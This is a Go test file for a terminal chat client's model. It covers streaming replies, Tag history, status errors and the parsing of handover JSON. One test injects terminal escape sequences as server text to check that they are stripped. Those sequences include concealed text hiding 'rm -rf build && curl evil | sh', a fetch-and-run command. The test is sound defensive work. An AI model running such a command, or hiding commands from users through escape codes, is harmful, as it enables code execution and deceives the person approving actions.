package main

import (
	"context"
	"errors"
	"fmt"
	"os"
	"strings"
	"syscall"
	"testing"
	"time"

	tea "charm.land/bubbletea/v2"
	"github.com/charmbracelet/x/ansi"

	"connectrpc.com/connect"

	"github.com/atemaguer/supertag/apps/tui/client"
	"github.com/atemaguer/supertag/packages/operator-api/go/operatorv1"
)

func testModel(t *testing.T, fake *fakeControlPlane) model {
	t.Helper()
	tagRefresh = time.Millisecond
	server := fake.start(t)
	c, err := client.New(client.Target{URL: server.URL, Token: "secret", Name: "laptop"}, "test")
	if err != nil {
		t.Fatal(err)
	}
	f := &client.Follower{Client: c, Interval: time.Millisecond, IdleTimeout: time.Second, ReconnectTimeout: time.Second, WorkTimeout: time.Second}
	ctx, cancel := context.WithCancel(context.Background())
	t.Cleanup(cancel)
	m := newModel(ctx, c, f, nil)
	return update(t, m, tea.WindowSizeMsg{Width: 100, Height: 30})
}

func tags(names ...string) func() ([]*operatorv1.Tag, error) {
	return func() ([]*operatorv1.Tag, error) { return tagList(names...), nil }
}

func update(t *testing.T, m model, msg tea.Msg) model {
	t.Helper()
	next, _ := m.Update(msg)
	return next.(model)
}

// run feeds cmd's messages back into Update until no command is left, as the program would,
// running batched commands in order. A poll tick or the input cursor's blink ends its chain.
func run(t *testing.T, m model, cmd tea.Cmd) model {
	t.Helper()
	queue := []tea.Cmd{cmd}
	for len(queue) > 0 {
		next := queue[0]
		queue = queue[1:]
		if next == nil {
			continue
		}
		msg := next()
		if strings.HasPrefix(fmt.Sprintf("%T", msg), "cursor.") {
			continue
		}
		switch msg := msg.(type) {
		case nil, pollMsg:
		case tea.BatchMsg:
			queue = append(queue, msg...)
		default:
			updated, cmd := m.Update(msg)
			m = updated.(model)
			queue = append(queue, cmd)
		}
	}
	return m
}

// start loads the Tags and the selected Tag's history, as Init does without the watch stream.
func start(t *testing.T, m model) model {
	t.Helper()
	return run(t, m, tea.Batch(m.reloadTags(), m.reloadConversations()))
}

func key(code rune) tea.KeyPressMsg { return tea.KeyPressMsg{Code: code} }

func screen(m model) string { return ansi.Strip(m.View().Content) }

func TestSendStreamsTheReplyAndWork(t *testing.T) {
	fake := &fakeControlPlane{
		tags: tags("lead", "builder"),
		send: func(req *operatorv1.SendMessageRequest) *operatorv1.Message {
			return waitingMessage("t1", req.GetText())
		},
		follow: func(_ context.Context, _ *operatorv1.FollowMessageRequest, stream *connect.ServerStream[operatorv1.FollowEvent]) error {
			for _, event := range []*operatorv1.FollowEvent{
				followEvent(1, command("", "rg discount")),
				followEvent(2, &operatorv1.Finish{Reply: finalReply("**Started** the fix."), Message: &operatorv1.Message{TaskId: "t1",
					WorkSessions: []*operatorv1.WorkSession{workSession("s1", "Validate percent", "w1", "")}}}),
				followEvent(3, &operatorv1.WorkSessionChanged{WorkSession: workSession("s1", "Validate percent", "w1", "Fixed it.")}),
				followEvent(4, &operatorv1.FollowEnd{Message: &operatorv1.Message{TaskId: "t1"}}),
			} {
				if err := stream.Send(event); err != nil {
					return err
				}
			}
			return nil
		},
	}
	m := start(t, testModel(t, fake))
	if !m.connected || m.selectedTag() != "lead" {
		t.Fatalf("connected=%v selected=%q status=%q", m.connected, m.selectedTag(), m.status)
	}
	m.input.SetValue("apply_discount accepts 150%")
	next, cmd := m.Update(key(tea.KeyEnter))
	m = run(t, next.(model), cmd)
	got := screen(m)
	for _, want := range []string{"laptop", "connected", "lead · default", "you", "apply_discount accepts 150%",
		"· running: rg discount", "Started the fix.", "· working: Validate percent", "· done: Validate percent", "Fixed it."} {
		if !strings.Contains(got, want) {
			t.Errorf("screen lacks %q:\n%s", want, got)
		}
	}
	if m.input.Value() != "" {
		t.Errorf("input not cleared: %q", m.input.Value())
	}
	if len(fake.sent) != 1 || fake.sent[0].GetTag() != "lead" || fake.sent[0].GetConversation() != "default" || fake.sent[0].GetIdempotencyKey() == "" {
		t.Errorf("sent = %v", fake.sent)
	}
}

func TestSelectingATagShowsItsHistory(t *testing.T) {
	answered := &operatorv1.Message{TaskId: "t1", Text: "What changed?", Status: operatorv1.ReplyStatus_REPLY_STATUS_REPLIED,
		Reply: finalReply("The **discount** rules."), WorkSessions: []*operatorv1.WorkSession{workSession("s1", "Audit", "w1", "Audited.")}}
	working := &operatorv1.Message{TaskId: "t2", Text: "Now fix it", Status: operatorv1.ReplyStatus_REPLY_STATUS_REPLIED,
		Reply: finalReply("Fixing."), WorkSessions: []*operatorv1.WorkSession{workSession("s2", "Fix", "w2", "")}}
	var asked []string
	fake := &fakeControlPlane{
		tags: tags("lead", "builder"),
		history: func(req *operatorv1.ListMessagesRequest) []*operatorv1.Message {
			asked = append(asked, req.GetTag()+"/"+req.GetConversation())
			if req.GetTag() != "lead" {
				return nil
			}
			return []*operatorv1.Message{working, answered}
		},
		follow: func(_ context.Context, req *operatorv1.FollowMessageRequest, stream *connect.ServerStream[operatorv1.FollowEvent]) error {
			if req.GetTaskId() != "t2" {
				t.Errorf("followed %s; only the unsettled message needs following", req.GetTaskId())
			}
			for _, event := range []*operatorv1.FollowEvent{
				followEvent(1, &operatorv1.Finish{Reply: finalReply("Fixing."), Message: working}),
				followEvent(2, &operatorv1.WorkSessionChanged{WorkSession: workSession("s2", "Fix", "w2", "Fixed.")}),
				followEvent(3, &operatorv1.FollowEnd{Message: working}),
			} {
				if err := stream.Send(event); err != nil {
					return err
				}
			}
			return nil
		},
	}
	m := testModel(t, fake)
	if _, cmd := m.Update(key(tea.KeyEnter)); cmd != nil {
		t.Fatal("nothing to send before the Tags load")
	}
	m = start(t, m)
	got := screen(m)
	order := []string{"What changed?", "The discount rules.", "· working: Audit", "· done: Audit", "Audited.",
		"Now fix it", "Fixing.", "· working: Fix", "· done: Fix", "Fixed."}
	at := 0
	for _, want := range order {
		i := strings.Index(got[at:], want)
		if i < 0 {
			t.Fatalf("screen lacks %q after position %d:\n%s", want, at, got)
		}
		at += i + len(want)
	}
	if strings.Count(got, "Fixing.") != 1 || strings.Count(got, "· working: Fix") != 1 {
		t.Fatalf("following the history repeated it:\n%s", got)
	}
	m = update(t, m, key(tea.KeyTab))
	next, cmd := m.Update(key(tea.KeyDown))
	m = run(t, next.(model), cmd)
	if !strings.Contains(screen(m), "Say something to builder") {
		t.Fatalf("builder's empty history:\n%s", screen(m))
	}
	next, cmd = m.Update(key(tea.KeyUp))
	m = run(t, next.(model), cmd)
	if strings.Join(asked, " ") != "lead/default builder/default" {
		t.Fatalf("history loads = %v, want one per Tag", asked)
	}
}

func TestErrorsShowInTheStatusBar(t *testing.T) {
	fake := &fakeControlPlane{tags: func() ([]*operatorv1.Tag, error) {
		return nil, connect.NewError(connect.CodeUnauthenticated, errors.New("The token is not valid"))
	}}
	m := start(t, testModel(t, fake))
	if m.connected || !strings.Contains(screen(m), "The token is not valid") ||
		!strings.Contains(screen(m), "Could not check for Tags") || m.inputShown() {
		t.Fatalf("status = %q:\n%s", m.status, screen(m))
	}
	m = update(t, m, tagsMsg{tags: nil, err: errors.New("dial tcp: connection refused")})
	if !strings.Contains(screen(m), "connection refused") {
		t.Fatalf("screen:\n%s", screen(m))
	}
}

func TestShowsSetupUntilATagExists(t *testing.T) {
	fake := &fakeControlPlane{tags: tags()}
	m := testModel(t, fake)
	if got := screen(m); !strings.Contains(got, "Checking for Tags") ||
		strings.Contains(got, conversationPlaceholder) || m.input.Focused() {
		t.Fatalf("screen before the Tag list loads:\n%s", got)
	}

	m = start(t, m)
	if got := screen(m); !strings.Contains(got, "Set up SuperTag") ||
		!strings.Contains(got, "supertag init") || strings.Contains(got, conversationPlaceholder) {
		t.Fatalf("screen without any Tags:\n%s", got)
	}
	m = update(t, m, tea.PasteMsg{Content: "Text entered before setup"})
	if m.input.Focused() || m.input.Value() != "" || m.inputShown() {
		t.Fatal("the conversation input must be unavailable until a Tag exists")
	}

	fake.tags = tags("lead")
	m = run(t, m, m.reloadTags())
	if got := screen(m); !strings.Contains(got, "lead · default") ||
		!strings.Contains(got, conversationPlaceholder) || !m.input.Focused() {
		t.Fatalf("screen after a Tag becomes available:\n%s", got)
	}

	fake.tags = tags()
	m = run(t, m, m.reloadTags())
	if got := screen(m); !strings.Contains(got, "supertag init") || m.inputShown() || m.input.Focused() {
		t.Fatalf("screen after the last Tag leaves:\n%s", got)
	}
	m = update(t, m, sentMsg{tag: "lead", conversation: "default", err: errors.New("Tag no longer exists")})
	m = update(t, m, tea.WindowSizeMsg{Width: 100, Height: 30})
	if got := screen(m); !strings.Contains(got, "Set up SuperTag") || !strings.Contains(got, "supertag init") {
		t.Fatalf("a late send error replaced setup guidance:\n%s", got)
	}
}

func TestTheWatchStreamDrivesTheRail(t *testing.T) {
	names := []string{"lead"}
	open := 0
	fake := &fakeControlPlane{
		tags: func() ([]*operatorv1.Tag, error) { return tagList(names...), nil },
		open: func() []*operatorv1.Conversation {
			return []*operatorv1.Conversation{{Tag: "lead", Name: "default", OpenWorkSessionCount: int32(open)}, {Tag: "lead", Name: "other", OpenWorkSessionCount: 5}}
		},
	}
	m := start(t, testModel(t, fake))
	closed := make(chan client.WatchUpdate)
	close(closed)
	watch := func(m model, update client.WatchUpdate) model {
		next, cmd := m.Update(watchMsg{update: update, updates: closed})
		return run(t, next.(model), cmd)
	}
	m = watch(m, client.WatchUpdate{Kind: client.WatchLive})
	reads := fake.reads()
	m = update(t, m, pollMsg{})
	if fake.reads() != reads || m.polling {
		t.Fatal("a live watch stream must stop polling")
	}

	names = []string{"lead", "reviewer"}
	m = watch(m, client.WatchUpdate{Kind: client.WatchChanged, Change: &operatorv1.WatchChange{Kind: operatorv1.WatchKind_WATCH_KIND_TAG, Tag: "reviewer"}})
	if !strings.Contains(m.renderRail(10), "reviewer") {
		t.Fatalf("a Tag change did not reread the Tags:\n%s", m.renderRail(10))
	}
	open = 2
	m = watch(m, client.WatchUpdate{Kind: client.WatchChanged, Change: &operatorv1.WatchChange{Kind: operatorv1.WatchKind_WATCH_KIND_CONVERSATION_MESSAGE, Tag: "lead"}})
	if rail := ansi.Strip(m.renderRail(10)); !strings.Contains(rail, "lead 2 open") || !strings.Contains(rail, "reviewer active") {
		t.Fatalf("rail:\n%s", rail)
	}

	next, cmd := m.Update(watchMsg{update: client.WatchUpdate{Kind: client.WatchLost, Err: errors.New("gone")}, updates: closed})
	m = next.(model)
	if m.live || !m.polling || cmd == nil {
		t.Fatal("a lost watch stream must start polling")
	}
	m = run(t, m, cmd)
	if fake.reads() <= reads+1 {
		t.Fatal("polling did not reread the Tags")
	}
	names = []string{"reviewer"}
	m = watch(m, client.WatchUpdate{Kind: client.WatchResync})
	if !m.live || m.selectedTag() != "reviewer" {
		t.Fatalf("a resync must reread everything: live=%v selected=%q", m.live, m.selectedTag())
	}
}

func TestKeysMoveFocusAndSelection(t *testing.T) {
	m := start(t, testModel(t, &fakeControlPlane{tags: tags("lead", "builder")}))
	m = update(t, m, key(tea.KeyTab))
	if m.focus != focusRail || m.input.Focused() {
		t.Fatal("tab should focus the rail")
	}
	m = update(t, m, key(tea.KeyDown))
	if m.selectedTag() != "builder" || !strings.Contains(screen(m), "builder · default") {
		t.Fatalf("selected %q", m.selectedTag())
	}
	m = update(t, m, key(tea.KeyRight))
	if m.focus != focusInput {
		t.Fatal("right should focus the input")
	}
	m = update(t, m, key(tea.KeyLeft))
	if m.focus != focusRail {
		t.Fatal("left on an empty input should focus the rail")
	}
	m = update(t, m, tea.WindowSizeMsg{Width: 60, Height: 12})
	if lines := strings.Count(m.View().Content, "\n") + 1; lines != 12 {
		t.Fatalf("view has %d lines after resize, want 12", lines)
	}
	if _, cmd := m.Update(key(tea.KeyEscape)); cmd == nil || cmd() != tea.Quit() {
		t.Fatal("esc should quit")
	}
}

func TestReadHandover(t *testing.T) {
	r, w, err := os.Pipe()
	if err != nil {
		t.Fatal(err)
	}
	go func() {
		fmt.Fprintln(w, `{"contexts":[{"url":"http://127.0.0.1:7468","token":"st_x"},{"url":"https://cp.example.com","token":"st_z","name":"team"}],"current":1}`)
		w.Close()
	}()
	h, err := readHandover(r)
	if err != nil || h.Current != 1 || len(h.Contexts) != 2 {
		t.Fatalf("readHandover() = %+v, %v", h, err)
	}
	if local, team := h.Contexts[0], h.Contexts[1]; local.URL != "http://127.0.0.1:7468" || local.Token != "st_x" || local.Name != "" ||
		team.URL != "https://cp.example.com" || team.Token != "st_z" || team.Name != "team" {
		t.Fatalf("readHandover() contexts = %+v", h.Contexts)
	}

	// `supertag` spawns with Node's stdio "pipe", which is a Unix socketpair.
	fds, err := syscall.Socketpair(syscall.AF_UNIX, syscall.SOCK_STREAM, 0)
	if err != nil {
		t.Fatal(err)
	}
	parent, child := os.NewFile(uintptr(fds[0]), "parent"), os.NewFile(uintptr(fds[1]), "supertag-target")
	go func() {
		fmt.Fprintln(parent, `{"contexts":[{"url":"http://127.0.0.1:7468","token":"st_y"}],"current":0}`)
		parent.Close()
	}()
	if h, err := readHandover(child); err != nil || h.Contexts[h.Current].Token != "st_y" {
		t.Fatalf("readHandover(socketpair) = %+v, %v", h, err)
	}

	for _, bad := range []string{
		`{"url":"http://x","token":"t"}`,
		`{"contexts":[],"current":0}`,
		`{"contexts":[{"url":"http://x","token":"t"}],"current":1}`,
		`{"contexts":[{"url":"http://x","token":"t"}],"current":-1}`,
		`{"contexts":[{"url":"http://x","token":"t"},{"url":"http://y"}],"current":0}`,
		`{"protocol":"runtime.v3","contexts":[{"url":"https://gateway.test","token":"t"}],"current":0}`,
	} {
		r, w, err := os.Pipe()
		if err != nil {
			t.Fatal(err)
		}
		go func() {
			fmt.Fprint(w, bad)
			w.Close()
		}()
		if _, err := readHandover(r); err == nil {
			t.Fatalf("readHandover(%s) must fail", bad)
		}
	}

	file, err := os.CreateTemp(t.TempDir(), "target")
	if err != nil {
		t.Fatal(err)
	}
	fmt.Fprint(file, `{"contexts":[{"url":"http://x","token":"t"}],"current":0}`)
	if _, err := readHandover(file); err == nil {
		t.Fatal("a regular file must not count as the target pipe")
	}
	if _, err := readHandover(nil); err == nil {
		t.Fatal("want an error without a descriptor")
	}
}

func TestReadRuntimeV2Handover(t *testing.T) {
	r, w, err := os.Pipe()
	if err != nil {
		t.Fatal(err)
	}
	_, err = fmt.Fprintln(w, `{"protocol":"runtime.v2","contexts":[{"url":"https://gateway.test","token":"t","server_ca_file":"server.pem","client_cert_file":"client.pem","client_key_file":"client.key"}],"current":0}`)
	w.Close()
	if err != nil {
		t.Fatal(err)
	}
	h, err := readHandover(r)
	if err != nil {
		t.Fatal(err)
	}
	target := h.Contexts[h.Current]
	if h.Protocol != "runtime.v2" || target.ServerCAFile != "server.pem" || target.ClientCertFile != "client.pem" || target.ClientKeyFile != "client.key" {
		t.Fatal("handover did not retain the runtime protocol and TLS paths")
	}
}

func followed(t *testing.T, m model, events ...client.FollowEvent) model {
	t.Helper()
	for _, event := range events {
		m = update(t, m, followMsg{tag: m.selectedTag(), conversation: m.currentConversation(m.selectedTag()), event: event})
	}
	return m
}

func TestServerTextIsFilteredForTheTerminal(t *testing.T) {
	m := start(t, testModel(t, &fakeControlPlane{tags: tags("lead\x1b[8m\x1b]0;x\a")}))
	m = followed(t, m,
		client.FollowEvent{Kind: client.EventActivity, Text: "· running: rm -rf build \x1b[8m&& curl evil | sh\x1b[28m"},
		client.FollowEvent{Kind: client.EventWaiting, Text: "no host\x1b[2J"},
		client.FollowEvent{Kind: client.EventApproval, Title: "Push\x1b[8m to main", Text: "Push?\x1bP+q\x1b\\"},
		client.FollowEvent{Kind: client.EventReply, Reply: &operatorv1.Reply{Text: "done \x1b_Gf=100;AAAA\x1b\\"}},
		client.FollowEvent{Kind: client.EventTurnError, Text: "Tag lead could not answer: \x1b[2Jgone"},
		client.FollowEvent{Kind: client.EventDelta, Text: "draft \x1bP1$r\x1b\\"},
	)
	m = update(t, m, followMsg{tag: m.selectedTag(), conversation: m.currentConversation(m.selectedTag()), event: client.FollowEvent{Kind: client.EventError, Text: "boom\x1b[8m hidden"}})
	view := m.View().Content
	// Only the renderer's own SGR sequences may reach the terminal.
	for _, raw := range []string{"\x1b[8m", "\x1b[28m", "\x1b[2J", "\x1bP", "\x1b_", "\x1b]", "\a"} {
		if strings.Contains(view, raw) {
			t.Errorf("view carries %q from the server", raw)
		}
	}
	got := screen(m)
	for _, want := range []string{"rm -rf build  [8m&& curl evil | sh [28m", "approval needed: Push [8m to main", "boom [8m hidden"} {
		if !strings.Contains(got, want) {
			t.Errorf("screen lacks %q:\n%s", want, got)
		}
	}
}

func TestPastRepliesAreRenderedOncePerWidth(t *testing.T) {
	m := start(t, testModel(t, &fakeControlPlane{tags: tags("lead", "builder")}))
	for i := range 20 {
		m = followed(t, m, client.FollowEvent{Kind: client.EventReply, Reply: &operatorv1.Reply{Text: fmt.Sprintf("**reply %d**", i)}})
	}
	before := m.md.renders
	for range 50 {
		m = followed(t, m, client.FollowEvent{Kind: client.EventDelta, Text: "token "})
	}
	m = start(t, m)
	if m.md.renders != before {
		t.Fatalf("streaming re-rendered %d past replies", m.md.renders-before)
	}
	m = update(t, m, tea.WindowSizeMsg{Width: 80, Height: 30})
	if m.md.renders != before+20 || !strings.Contains(screen(m), "reply 19") {
		t.Fatalf("a resize rendered %d replies, want 20", m.md.renders-before)
	}
}

func TestRailRowsFitAndScrollToTheSelection(t *testing.T) {
	var names []string
	for i := range 12 {
		names = append(names, fmt.Sprintf("%02d-security-reviewer", i))
	}
	m := start(t, testModel(t, &fakeControlPlane{tags: tags(names...)}))
	m = update(t, m, tea.WindowSizeMsg{Width: 80, Height: 10})
	rail := ansi.Strip(m.renderRail(9))
	if rows := strings.Split(rail, "\n"); len(rows) != 9 || !strings.Contains(rows[1], "00-security-re… active") || !strings.Contains(rows[2], "01-security-re… active") {
		t.Fatalf("rail rows wrap:\n%s", rail)
	}
	m = update(t, m, key(tea.KeyTab))
	for range 11 {
		m = update(t, m, key(tea.KeyDown))
	}
	if rail := ansi.Strip(m.renderRail(9)); !strings.Contains(rail, "11-security-re…") || strings.Contains(rail, "00-security") {
		t.Fatalf("rail does not scroll:\n%s", rail)
	}
	if !strings.Contains(m.renderRail(9), focusedSel.Render("11-security-re…")) {
		t.Fatalf("the selected last Tag is not highlighted:\n%s", m.renderRail(9))
	}
}
